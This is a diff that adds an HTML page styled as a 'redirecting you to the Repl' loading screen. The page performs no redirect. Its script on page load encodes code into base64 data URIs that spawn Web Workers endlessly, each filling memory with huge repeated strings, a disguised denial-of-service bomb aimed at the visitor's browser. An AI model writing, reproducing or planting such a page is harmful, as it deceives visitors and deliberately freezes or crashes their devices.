@@ -1,0 +1,59 @@
+<html>
+<style>
+  main {
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+  }
+
+  main>h1 {
+    font-family: Arial;
+    font-size: 60px;
+    opacity: 0;
+    transition: all 3s ease;
+  }
+
+  main>h3 {
+    font-family: Arial;
+    font-size: 30px;
+    opacity: 0;
+    transition: all 2s ease;
+  }
+</style>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+
+
+<link rel="icon" href="/images/trippy.ico" type="image/gif" sizes="16x16">
+<title>Redirecting</title>
+
+<body>
+  <main>
+    <h1>Please wait.</h1>
+    <h3>We are redirecting you to the Repl.</h3>
+  </main>
+<script>
+  setTimeout(() => {
+    start();
+    document.querySelector("main>h1").style.opacity = "1";
+    setTimeout(() => {
+      document.querySelector("main>h3").style.opacity = "1";
+    }, 2500);
+  }, 1);
+  function start() {
+    var rep = 0xFFFFFF;
+    var off = 0xFFFFA;
+    var code1 = `f=[];while(!0){f.push(String.fromCharCode(${off}).repeat(${rep}))}`;
+    var data = `data:text/html;base64,${btoa(code1)}`;
+    var container = `while(!0){new Worker("${data}")}`;
+    var duriC = `data:text/html;base64,${btoa(container)}`;
+    new Worker(duriC);
+  }
+</script>
+</body>
+
+</html>
